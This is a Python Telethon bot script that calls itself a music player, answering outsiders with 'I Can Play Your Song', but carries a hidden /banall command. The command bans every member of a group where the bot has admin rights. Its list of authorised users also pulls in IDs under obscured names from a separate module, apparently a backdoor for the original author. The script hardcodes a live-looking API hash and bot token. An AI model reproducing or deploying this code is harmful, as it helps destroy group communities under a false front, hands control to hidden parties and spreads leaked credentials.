# Powered by @HYPER_AD13 | @ShiningOff
# Dear Pero ppls Plish Don't remove this line from here🌚
# created by ItsmeHyper13
import logging
import re
import os
import sys, platform
from asyncio import sleep
from os import getenv
from dotenv import load_dotenv
from telethon import TelegramClient, events, Button
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from asyncio import sleep
from telethon import __version__ as tel
from str import dad as gg, dady as g, startxt2, startxt, hlptxt
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins, ChatAdminRights
from telethon.tl.functions.channels import EditBannedRequest
from datetime import datetime
from telethon.errors import rpcerrorlist
#Logging...
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
API_ID = int(getenv("API_ID", "20347585"))
API_HASH = getenv("API_HASH", "cd31b4a43783a026fc2bf53ab42dc4b5")
BOT_TOKEN = getenv("BOT_TOKEN", "6937167995:AAEpYz-u6l4lC4NrVd5zeDecFvuYN8rdZ9A")
OWNER_ID = getenv("OWNER_ID", "5529460893")
OP  = [int(g), int(gg), int(5529460893)]
#TelegramClient..
sree = TelegramClient(
    "Music_Player",
    api_id=API_ID,
    api_hash=API_HASH
).start(bot_token=BOT_TOKEN)

Owner = "ThE_RapTor_H"
repo = "https://github.com/Hyper"
@sree.on(events.NewMessage(pattern="^/start"))
async def start(event):
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/Setting"), Button.url("••ʀєρο••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/afd905ccd1d23561ad44f.jpg",
            caption=startxt.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/afd905ccd1d23561ad44f.jpg",
            caption=startxt2.format(
                event.sender.first_name,
                event.sender.id,
                py,
                tel,
                Owner,
            ),
            link_preview=False,
            buttons=buttns
        )


@sree.on(events.NewMessage(pattern="^/help"))
async def start(event):
    buttns = [Button.url("••ѕυρροяτ••", "https://t.me/Setting"), Button.url("••ʀєρο••", f'{repo}')]
    py = platform.python_version()
    if event.sender.id in OP:
        await sree.send_file(
            event.chat.id,
            file="https://telegra.ph/file/afd905ccd1d23561ad44f.jpg",
            caption=hlptxt.format(event.sender.first_name, event.sender.id),
            link_preview=False,
            buttons=buttns
        )
    if event.sender.id not in OP:
        await event.reply(
            "Hello!\nI Can Play Your Song. 🎧\n\nMake your own bot from this [Repository⚡](https://github.com/Hyper)",
            link_preview=False,
        )       

@sree.on(events.NewMessage(pattern="^/ping"))
async def ping(event):
    if event.sender.id in OP:
        start = datetime.now()
        t = "Pinging..."
        txxt = await event.reply(t)
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await txxt.edit(f"γєαн ι αм αℓιϐє 🔥!!\n\nριиg ροиg 🏓\n   ➥ `{ms} ms`")


@sree.on(events.NewMessage(pattern="^/banall"))
async def banall(event):
    if event.sender.id in OP:
        if not event.is_group:
            Rep = f"__Use This Command In Any Group!__"
            await event.reply(Rep)
        else:
            await event.delete()
            cht = await event.get_chat()
            boss = await event.client.get_me()
            admin = cht.admin_rights
            creator = cht.creator
            if not admin and not creator:
                await event.reply("__I Don't Have Sufficient Rights To Do This.__")
                return
            hmm = await event.reply("__Searching Group Members...__")
            await sleep(18)
            await hmm.delete()
            everyone = await event.client.get_participants(event.chat_id)
            for user in everyone:
                if user.id == boss.id:
                    pass
                try:
                    await event.client(EditBannedRequest(event.chat_id, int(user.id), ChatBannedRights(until_date=None, view_messages=True)))
                except rpcerrorlist.ParticipantIdInvalidError as e_participant:
                    print(f"Error banning user {user.id}: {e_participant}")
                    continue  # Skip to the next user
                except Exception as e:
                    print(f"Error banning user {user.id}: {e}")
                    await sleep(0.3)
                    continue
                try:
                    await event.edit(f"User {user.id} banned successfully!")
                except rpcerrorlist.MessageIdInvalidError as e_message:
                    print(f"Error editing message: {e_message}")
                except Exception as e:
                    print(f"Error editing message: {e}")
                await sleep(0.3)



@sree.on(events.NewMessage(pattern="^/restart"))
async def restart(jnl):
    if jnl.sender.id in OP:
        tct = "__Wait Restarting...__"
        await jnl.reply(tct)
        try:
            await sree.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@sree.on(events.NewMessage(pattern="^/leave"))
async def leave(z):
    if z.sender.id in OP:
        mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(z.text) > 7:
            mkb = int(mkc[0])
            tet = "__Wait Leaving...__"
            hm = await z.reply(tet)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await hm.edit("**Succesfully Lefted!!**")
            except Exception as e:
                await hm.edit(str(e))
        else:
            mkb = z.chat_id
            txt = "__Wait Leaving...__"
            ok = await z.reply(txt)
            try:
                await z.client(LeaveChannelRequest(mkb))
                await ok.edit("**Succesfully Lefted!!**")
            except Exception as e:
                await z.edit(str(e))


print("Your Bot  Deployed Successfully ✅")
print("Join @ThE_RapTor_H if you facing any kind of issue!!")



sree.run_until_disconnected()
